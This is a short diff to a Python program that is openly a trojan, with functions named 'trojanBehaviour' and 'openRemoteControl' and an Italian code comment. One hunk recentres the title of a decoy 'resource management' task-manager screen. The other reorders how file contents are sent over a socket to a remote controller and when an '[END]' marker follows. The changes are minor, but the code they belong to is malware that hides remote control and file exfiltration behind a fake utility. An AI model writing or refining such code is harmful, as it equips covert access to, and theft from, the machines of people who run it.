@@ -32,7 +32,7 @@ def trojanBehaviour():
             ram = psutil.virtual_memory().percent
             disk = psutil.disk_usage("/").percent
             processes_count = 0
-            print("\n\b\b\bRESOURCE MANAGEMENT SYSTEM\n")
+            print("\n                         RESOURCE MANAGEMENT SYSTEM                   \n")
             print("              --     Task manager: Current state of usage      --\n\n")
             # facciamo un display a video dell'utilizzo
             print("              --------------------------------------------------------- ")
@@ -307,8 +307,9 @@ def openRemoteControl(client):
                                 client.send(line)
 
                             time.sleep(2)
-                            client.send(("[END]").encode(FORMAT))
                             f.close()
+                            client.send(("[END]").encode(FORMAT))
+                            time.sleep(3)
                 except:
                     traceback.print_exc()
                     client.send(("[ERROR]").encode(FORMAT))
